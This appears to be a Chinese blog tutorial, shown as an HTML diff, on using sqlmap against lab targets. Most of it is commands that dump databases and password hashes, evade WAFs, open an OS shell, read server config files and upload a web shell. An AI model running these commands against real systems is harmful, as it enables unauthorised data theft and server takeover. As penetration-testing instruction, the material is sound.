@@ -6,18 +6,21 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://www.squidward.xyz">
-  <title>Archives | Squidward的个人博客</title>
+  <title>sqlmap使用详解 | Squidward的个人博客</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta name="description" content="Web安全">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Squidward的个人博客">
-<meta property="og:url" content="http://www.squidward.xyz/archives/index.html">
+  <meta name="description" content="注入神器Sqlmap使用详解">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqlmap使用详解">
+<meta property="og:url" content="http://www.squidward.xyz/2021/05/12/sqlmap%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/index.html">
 <meta property="og:site_name" content="Squidward的个人博客">
-<meta property="og:description" content="Web安全">
+<meta property="og:description" content="注入神器Sqlmap使用详解">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-05-12T12:45:15.000Z">
+<meta property="article:modified_time" content="2021-05-12T12:46:03.350Z">
 <meta property="article:author" content="Squidward">
+<meta property="article:tag" content="Tools">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="Squidward的个人博客" type="application/atom+xml">
@@ -191,41 +194,248 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-sqlmap使用详解" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
   
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2021" class="archive-year">2021</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
+    <h1 class="article-title" itemprop="name">
+      sqlmap使用详解
+    </h1>
+  
+
+
+  
+  
+        
+        <span id="busuanzi_container_page_pv" style='display:none' class="archive-article-date">
+              <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
+        </span>
+
 <a href="/2021/05/12/sqlmap%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/" class="archive-article-date">
         <time datetime="2021-05-12T12:45:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-05-12</time>
 </a>
 
+  
+  
+    
+<div style="margin-top:10px;">
+  <span class="post-time">
+    <span class="post-meta-item-icon">
+      <!-- fonts.scss -->
+      <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
+      <i class="icon-statistics"></i>
+      <span class="post-meta-item-text"> 字数统计:</span>
+      <span class="post-count">3.3k字</span>
+    </span>
+  </span>
+
+  <span class="post-time">
+    &nbsp; | &nbsp;
+    <span class="post-meta-item-icon">
+      <i class="icon-book icon"></i>
+      <span class="post-meta-item-text"> 阅读时长≈</span>
+      <span class="post-count">13分</span>
+    </span>
+  </span>
+</div>
+
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <p>注入神器Sqlmap使用详解</p>
+<a id="more"></a>
+
+
+
+<h3 id="一-Sqlmap介绍"><a href="#一-Sqlmap介绍" class="headerlink" title="一. Sqlmap介绍"></a>一. Sqlmap介绍</h3><p><strong>Sqlmap</strong>是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL进行SQL注入。目前支持的数据库有MySql、Oracle、Access、PostageSQL、SQL Server、IBM DB2、SQLite、Firebird、Sybase和SAP MaxDB等</p>
+<p>Sqlmap采用了以下5种独特的SQL注入技术</p>
+<ul>
+<li>基于布尔类型的盲注，即可以根据返回页面判断条件真假的注入</li>
+<li>基于时间的盲注，即不能根据页面返回的内容判断任何信息，要用条件语句查看时间延迟语句是否已经执行(即页面返回时间是否增加)来判断</li>
+<li>基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回到页面中</li>
+<li>联合查询注入，在可以使用Union的情况下注入</li>
+<li>堆查询注入，可以同时执行多条语句时的注入</li>
+</ul>
+<p>Sqlmap的强大的功能包括 数据库指纹识别、数据库枚举、数据提取、访问目标文件系统，并在获取完全的操作权限时执行任意命令。</p>
+<p>sqlmap是一个跨平台的工具，很好用，是SQL注入方面一个强大的工具！</p>
+<p>我们可以使用 -h 参数查看sqlmap的参数以及用法，<strong>sqlmap -h</strong></p>
+<h3 id="二-Sqlmap的简单用法"><a href="#二-Sqlmap的简单用法" class="headerlink" title="二. Sqlmap的简单用法"></a>二. Sqlmap的简单用法</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r http.txt  #http.txt是我们抓取的http的请求包</span><br><span class="line">sqlmap -r http.txt -p username  #指定参数，当有多个参数而你又知道username参数存在SQL漏洞，你就可以使用-p指定参数进行探测</span><br><span class="line">sqlmap -u &quot;http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">10</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span>&quot;   #探测该url是否存在漏洞</span><br><span class="line">sqlmap -u &quot;http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">10</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span>&quot; --cookie=&quot;抓取的cookie&quot;   #当该网站需要登录时，探测该url是否存在漏洞</span><br><span class="line">sqlmap -u &quot;http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">10</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span>&quot; --data=&quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot;  #抓取其post提交的数据填入</span><br><span class="line">sqlmap -u &quot;http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">10</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span>&quot; --users      #查看数据库的所有用户</span><br><span class="line">sqlmap -u &quot;http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">10</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span>&quot; --passwords  #查看数据库用户名的密码</span><br><span class="line">sqlmap -u &quot;http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">10</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span>&quot; --current-user  #查看数据库当前的用户</span><br><span class="line">sqlmap -u &quot;http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">10</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span>&quot; --is-dba    #判断当前用户是否有管理员权限</span><br><span class="line">sqlmap -u &quot;http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">10</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span>&quot; --roles     #列出数据库所有管理员角色，仅适用于oracle数据库的时候</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">10</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span>&quot;  --dbs        #爆出所有的数据库</span><br><span class="line">sqlmap -u &quot;http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">10</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span>&quot;  --tables     #爆出所有的数据表</span><br><span class="line">sqlmap -u &quot;http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">10</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span>&quot;  --columns    #爆出数据库中所有的列</span><br><span class="line">sqlmap -u &quot;http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">10</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span>&quot;  --current-db #查看当前的数据库</span><br><span class="line">sqlmap -u &quot;http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">10</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span>&quot; -D security --tables #爆出数据库security中的所有的表</span><br><span class="line">sqlmap -u &quot;http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">10</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span>&quot; -D security -T users --columns #爆出security数据库中users表中的所有的列</span><br><span class="line">sqlmap -u &quot;http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">10</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span>&quot; -D security -T users -C username --dump  #爆出数据库security中的users表中的username列中的所有数据</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">10</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span>&quot; -D security -T users --dump-all #爆出数据库security中的users表中的所有数据</span><br><span class="line">sqlmap -u &quot;http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">10</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span>&quot; -D security --dump-all   #爆出数据库security中的所有数据</span><br><span class="line">sqlmap -u &quot;http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">10</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span>&quot; --dump-all  #爆出该数据库中的所有数据</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://192.168.10.1/sqli/Less-1/?id=1&quot; --tamper=space2comment.py  #指定脚本进行过滤，用/**/代替空格</span><br><span class="line">sqlmap -u &quot;http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">10</span>.<span class="number">1</span>/sqli/Less-<span class="number">4</span>/?id=<span class="number">1</span>&quot; --level=<span class="number">5</span> --risk=<span class="number">3</span> #探测等级<span class="number">5</span>，平台危险等级<span class="number">3</span>，都是最高级别。当level=<span class="number">2</span>时，会测试cookie注入。当level=<span class="number">3</span>时，会测试user-agent/referer注入。</span><br><span class="line">sqlmap -u &quot;http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">10</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span>&quot; --sql-shell  #执行指定的sql语句</span><br><span class="line">sqlmap -u &quot;http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">10</span>.<span class="number">1</span>/sqli/Less-<span class="number">4</span>/?id=<span class="number">1</span>&quot; --os-shell/--os-<span class="built_in">cmd</span>   #执行--os-shell命令，获取目标服务器权限</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">10</span>.<span class="number">1</span>/sqli/Less-<span class="number">4</span>/?id=<span class="number">1</span>&quot; --file-read &quot;c:/test.txt&quot; #读取目标服务器C盘下的test.txt文件</span><br><span class="line">sqlmap -u &quot;http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">10</span>.<span class="number">1</span>/sqli/Less-<span class="number">4</span>/?id=<span class="number">1</span>&quot; --file-write  test.txt  --file-dest &quot;e:/hack.txt&quot;  #将本地的test.txt文件上传到目标服务器的E盘下，并且名字为hack.txt</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">10</span>.<span class="number">1</span>/sqli/Less-<span class="number">4</span>/?id=<span class="number">1</span>&quot; --dbms=&quot;MySQL&quot;     #指定其数据库为mysql Firebird, HSQLDB, IBM DB2, Informix, Microsoft Access, Microsoft SQL Server, MySQL, Oracle, PostgreSQL, SAP MaxDB, SQLite, Sybase</span><br><span class="line">sqlmap -u &quot;http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">10</span>.<span class="number">1</span>/sqli/Less-<span class="number">4</span>/?id=<span class="number">1</span>&quot; --random-agent   #使用任意的User-Agent爆破</span><br><span class="line">sqlmap -u &quot;http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">10</span>.<span class="number">1</span>/sqli/Less-<span class="number">4</span>/?id=<span class="number">1</span>&quot; --proxy=&quot;http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">8080</span>&quot;    #指定代理</span><br><span class="line">sqlmap -u &quot;http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">10</span>.<span class="number">1</span>/sqli/Less-<span class="number">4</span>/?id=<span class="number">1</span>&quot; --technique T    #指定时间延迟注入，这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式，当然，我们也可以直接手工指定。</span><br><span class="line">支持的探测方式如下：</span><br><span class="line"><span class="function">　　B: <span class="title">Boolean</span>-<span class="title">based</span> <span class="title">blind</span> <span class="title">SQL</span> <span class="title">injection</span>（布尔型注入）</span></span><br><span class="line"><span class="function">　　<span class="title">E</span>: <span class="title">Error</span>-<span class="title">based</span> <span class="title">SQL</span> <span class="title">injection</span>（报错型注入）</span></span><br><span class="line"><span class="function">　　<span class="title">U</span>: <span class="title">UNION</span> <span class="title">query</span> <span class="title">SQL</span> <span class="title">injection</span>（可联合查询注入）</span></span><br><span class="line"><span class="function">　　<span class="title">S</span>: <span class="title">Stacked</span> <span class="title">queries</span> <span class="title">SQL</span> <span class="title">injection</span>（可多语句查询注入）</span></span><br><span class="line"><span class="function">　　<span class="title">T</span>: <span class="title">Time</span>-<span class="title">based</span> <span class="title">blind</span> <span class="title">SQL</span> <span class="title">injection</span>（基于时间延迟注入）</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">-<span class="title">v3</span>                   #输出详细度  最大值5 会显示请求包和回复包</span></span><br><span class="line"><span class="function">--<span class="title">threads</span> 5           #指定线程数</span></span><br><span class="line"><span class="function">--<span class="title">fresh</span>-<span class="title">queries</span>       #清除缓存</span></span><br><span class="line"><span class="function">--<span class="title">flush</span>-<span class="title">session</span>       #清空会话，重构注入</span></span><br><span class="line"><span class="function">--<span class="title">batch</span>               #对所有的交互式的都是默认的</span></span><br><span class="line"><span class="function">--<span class="title">random</span>-<span class="title">agent</span>        #任意的<span class="title">http</span>头</span></span><br><span class="line"><span class="function">--<span class="title">tamper</span> <span class="title">base64encode</span>            #对提交的数据进行<span class="title">base64</span>编码</span></span><br><span class="line"><span class="function">--<span class="title">referer</span> <span class="title">http</span>://<span class="title">www.baidu.com</span>   #伪造<span class="title">referer</span>字段</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">--<span class="title">keep</span>-<span class="title">alive</span>     保持连接，当出现 [<span class="title">CRITICAL</span>] <span class="title">connection</span> <span class="title">dropped</span> <span class="title">or</span> <span class="title">unknown</span> <span class="title">HTTP</span> <span class="title">status</span> <span class="title">code</span> <span class="title">received</span>. <span class="title">sqlmap</span> <span class="title">is</span> <span class="title">going</span> <span class="title">to</span> <span class="title">retry</span> <span class="title">the</span> <span class="title">request</span>(<span class="title">s</span>) 保错的时候，使用这个参数</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="1-探测指定URL是否存在SQL注入漏洞"><a href="#1-探测指定URL是否存在SQL注入漏洞" class="headerlink" title="1. 探测指定URL是否存在SQL注入漏洞"></a>1. 探测指定URL是否存在SQL注入漏洞</h4><p><strong>对于不用登录的网站，直接指定其URL</strong>：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost/?id=<span class="number">1</span>&quot;  #探测URL是否存在SQL注入漏洞</span><br></pre></td></tr></table></figure>
+
+<p>如果成功探测到sql注入漏洞，最后sqlmap还会列出注入类型，目标系统版本，php，apache等信息。</p>
+<p><strong>对于需要登录的网站，手动指定其cookie</strong>：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost/?id=<span class="number">1</span>&quot; --cookie=&quot;抓取的cookie&quot;  #抓包拿到cookie</span><br></pre></td></tr></table></figure>
+
+<p><strong>对于用post方式提交参数的URL，手动指定其data参数</strong>：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost/&quot; --data=&quot;id=<span class="number">1</span>&amp;submit=Submit&quot;  #抓取其post提交的数据填入</span><br></pre></td></tr></table></figure>
+
+<p><strong>也可以直接抓取http数据包保存为txt文件，然后指定该文件探测</strong>：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r request.txt  ##探测request.txt文件中的http数据包是否存在sql注入漏洞</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="2-查看数据库的所有用户"><a href="#2-查看数据库的所有用户" class="headerlink" title="2. 查看数据库的所有用户"></a>2. 查看数据库的所有用户</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost/?id=<span class="number">1</span>&quot; --users</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="3-查看数据库所有用户名的密码"><a href="#3-查看数据库所有用户名的密码" class="headerlink" title="3. 查看数据库所有用户名的密码"></a>3. 查看数据库所有用户名的密码</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost/?id=<span class="number">1</span>&quot; --password</span><br></pre></td></tr></table></figure>
+
+<p>这里会有交互询问：是否保存密码的hash值为文件、是否使用sqlmap自带的字典进行爆破等。</p>
+<h4 id="4-查看数据库当前用户"><a href="#4-查看数据库当前用户" class="headerlink" title="4. 查看数据库当前用户"></a>4. 查看数据库当前用户</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost/?id=<span class="number">1</span>&quot; --current-user</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="5-判断当前用户是否有管理权限"><a href="#5-判断当前用户是否有管理权限" class="headerlink" title="5. 判断当前用户是否有管理权限"></a>5. 判断当前用户是否有管理权限</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost/?id=<span class="number">1</span>&quot; --is-dba</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="6-列出数据库管理员角色"><a href="#6-列出数据库管理员角色" class="headerlink" title="6. 列出数据库管理员角色"></a>6. 列出数据库管理员角色</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost/?id=<span class="number">1</span>&quot; --roles</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="7-查看所有的数据库"><a href="#7-查看所有的数据库" class="headerlink" title="7. 查看所有的数据库"></a>7. 查看所有的数据库</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost/?id=<span class="number">1</span>&quot; --dbs</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="8-爆出当前数据库"><a href="#8-爆出当前数据库" class="headerlink" title="8. 爆出当前数据库"></a>8. 爆出当前数据库</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost/?id=<span class="number">1</span>&quot; --current-db</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="9-爆出指定数据库中的所有表"><a href="#9-爆出指定数据库中的所有表" class="headerlink" title="9. 爆出指定数据库中的所有表"></a>9. 爆出指定数据库中的所有表</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost/?id=<span class="number">1</span>&quot; -D 数据库名 --tables</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="10-爆出指定数据库中指定表的所有列"><a href="#10-爆出指定数据库中指定表的所有列" class="headerlink" title="10. 爆出指定数据库中指定表的所有列"></a>10. 爆出指定数据库中指定表的所有列</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost/?id=<span class="number">1</span>&quot; -D 数据库名 -T 表名 --columns</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="11-爆出指定表指定列下的数据"><a href="#11-爆出指定表指定列下的数据" class="headerlink" title="11. 爆出指定表指定列下的数据"></a>11. 爆出指定表指定列下的数据</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost/?id=<span class="number">1</span>&quot; -D 数据库名 -T 表名 -C 列名 --dump</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="12-爆出该网站数据库中的所有数据"><a href="#12-爆出该网站数据库中的所有数据" class="headerlink" title="12. 爆出该网站数据库中的所有数据"></a>12. 爆出该网站数据库中的所有数据</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#爆出该数据库中的所有数据sqlmap -u &quot;http://localhost/?id=<span class="number">1</span>&quot; --dump-all  #爆出数据库security中的所有数据sqlmap -u &quot;http://localhost/?id=<span class="number">1</span>&quot; -D security --dump-all   #爆出数据库security中的users表中的所有数据sqlmap -u &quot;http://localhost/?id=<span class="number">1</span>&quot; -D security -T users --dump-all </span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="三-Sqlmap的高级用法"><a href="#三-Sqlmap的高级用法" class="headerlink" title="三. Sqlmap的高级用法"></a>三. Sqlmap的高级用法</h3><p>Sqlmap在默认情况下除了适用CHAR()函数防止出现单引号，没有对注入的数据进行修改。</p>
+<p>我们可以使用<code>--tamper</code>参数对数据进行修改来绕过WAF等设备，其中的大部分脚本主要用正则模块替换攻击载荷字符编码的方式尝试绕过WAF的检测规则。</p>
+<p>sqlmap自带的脚本在目录：/usr/share/sqlmap/tamper</p>
+<h4 id="1-探测指定URL是否存在WAF，并绕过"><a href="#1-探测指定URL是否存在WAF，并绕过" class="headerlink" title="1. 探测指定URL是否存在WAF，并绕过"></a>1. 探测指定URL是否存在WAF，并绕过</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--identify-waf   检测是否有WAF#使用下列参数尝试进行绕过--random-agent    使用任意HTTP头进行绕过，尤其是在WAF配置不当的时候--<span class="built_in">time</span>-sec=<span class="number">3</span>      使用长的延时来避免触发WAF的机制，这方式比较耗时--hpp             使用HTTP 参数污染进行绕过，尤其是在ASP.<span class="built_in">NET</span>/IIS 平台上--proxy=<span class="number">100</span>.<span class="number">100</span>.<span class="number">100</span>.<span class="number">100</span>:<span class="number">8080</span> --proxy-cred=<span class="number">211</span>:<span class="number">985</span>      使用代理进行绕过--ignore-proxy    禁止使用系统的代理，直接连接进行注入--flush-session   清空会话，重构注入--hex 或者 --no-cast     进行字符码转换--mobile          对移动端的服务器进行注入--tor             匿名注入</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="2-指定脚本进行绕过"><a href="#2-指定脚本进行绕过" class="headerlink" title="2. 指定脚本进行绕过"></a>2. 指定脚本进行绕过</h4><p>有些时候网站会过滤掉各种字符，可以用<code>--tamper</code>参数来解决（对付某些waf时也有成效）</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap  --tamper=space2comment.py  #用/**/代替空格sqlmap  --tamper=&quot;space2comment.py,space2plus.py&quot;  指定多个脚本进行过滤</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="3-探测等级和危险等级"><a href="#3-探测等级和危险等级" class="headerlink" title="3. 探测等级和危险等级"></a>3. 探测等级和危险等级</h4><p>Sqlmap一共有5个探测等级，默认是1。等级越高，说明探测时使用的payload也越多。其中5级的payload最多，会自动破解出cookie、XFF等头部注入。当然，等级越高，探测的时间也越慢。这个参数会影响测试的注入点，GET和POST的数据都会进行测试，HTTP cookie在level为2时就会测试，HTTP  User-Agent/Referer头在level为3时就会测试。在不确定哪个参数为注入点时，为了保证准确性，建议设置level为5</p>
+<p>sqlmap一共有3个危险等级，也就是说你认为这个网站存在几级的危险等级。和探测等级一个意思，在不确定的情况下，建议设置为3级，–risk=3</p>
+<p>sqlmap使用的payload在目录：**/usr/share/sqlmap/xml/payloads**</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost/?id=<span class="number">1</span>&quot; --level=<span class="number">5</span> --risk=<span class="number">3</span> #探测等级<span class="number">5</span>，平台危险等级<span class="number">3</span>，都是最高级别</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="4-伪造Http-Referer头部"><a href="#4-伪造Http-Referer头部" class="headerlink" title="4. 伪造Http Referer头部"></a>4. 伪造Http Referer头部</h4><p>Sqlmap可以在请求中伪造HTTP中的referer，可以使用referer命令来欺骗。（当探测等级为3或者3以上时，会尝试对referer注入）比如，我们伪造referer头为百度：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost/?id=<span class="number">1</span>&quot; --referer http://www.baidu.com</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="5-执行指定的SQL语句"><a href="#5-执行指定的SQL语句" class="headerlink" title="5. 执行指定的SQL语句"></a>5. 执行指定的SQL语句</h4><p>加入<code>--sql-shell</code>参数，然后会提示我们输入要查询的SQL语句，注意这里的输入的SQL语句不要有分号。</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost/?id=<span class="number">1</span>&quot; --sql-shell</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="6-执行操作系统命令"><a href="#6-执行操作系统命令" class="headerlink" title="6. 执行操作系统命令"></a>6. 执行操作系统命令</h4><p>在数据库为Mysql、PostgreSql或者SQL Server时，当满足下面三个条件，我们就可以执行操作系统命令</p>
+<ul>
+<li>网站必须是root权限</li>
+<li>攻击者需要知道网站的绝对路径</li>
+<li>GPC为off，php主动转义的功能关闭</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost/?id=<span class="number">1</span>&quot; --os-shell</span><br></pre></td></tr></table></figure>
+
+<p>这里会sqlmap会交互询问网站支持的脚本语言、指定网站根目录的方式等，最后光标前显示<code>os-shell&gt;</code>即成功拿到shell。</p>
+<h4 id="7-从数据库中读取文件"><a href="#7-从数据库中读取文件" class="headerlink" title="7. 从数据库中读取文件"></a>7. 从数据库中读取文件</h4><p>当数据库为Mysql、PostgreSQL或SQL Server，并且当前用户有权限时，可以读取指定文件，可以是文本文件或者二进制文件。</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost/?id=<span class="number">1</span>&quot; --file-read &quot;/var/www/html/config.php&quot; </span><br></pre></td></tr></table></figure>
+
+<p>从显示信息中可以看到读取的文件内容已经成功保存在 /root/.local/share/sqlmap/output/localhost中。</p>
+<h4 id="8-上传文件到数据库服务器中"><a href="#8-上传文件到数据库服务器中" class="headerlink" title="8. 上传文件到数据库服务器中"></a>8. 上传文件到数据库服务器中</h4><p>当数据库为Mysql、Postgre SQL或者Sql Server，并且当前用户有权限使用特定的函数时，可以上传文件到数据库服务器。文件可以是文本，也可以是二进制文件。</p>
+<p>所以利用上传文件，我们可以上传一句话木马或者上传shell上去。</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost/?id=<span class="number">1</span>&quot; --file-write shell.php --file-dest &quot;/var/www/html/x.php&quot;  #将本地的shell.php文件上传到目标服务器的/var/www/html路径下，并命名为x.php</span><br></pre></td></tr></table></figure>
+
+<p>这里会交互询问我们是否想验证上传成功，我们选择 y 的话，他就会读取该文件的大小，并且和本地的文件大小做比较，只要大于等于本地文件大小即说明上传成功了。</p>
+
+    
+
+    
+    <div class="page-reward">
